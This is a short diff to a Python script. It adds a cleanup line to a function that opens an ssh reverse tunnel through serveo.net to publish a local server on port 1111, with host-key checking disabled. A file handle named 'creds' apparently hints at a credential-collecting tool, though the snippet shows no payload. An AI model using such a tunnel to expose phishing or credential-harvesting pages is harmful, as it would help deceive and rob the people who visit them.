@@ -274,6 +274,7 @@ def runPEnv(): #menu where user select what they wanna use
 
 
 def runServeo():
+    system('rm link.url 2> /dev/null')
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
     sleep(7)
     with open('link.url') as creds:
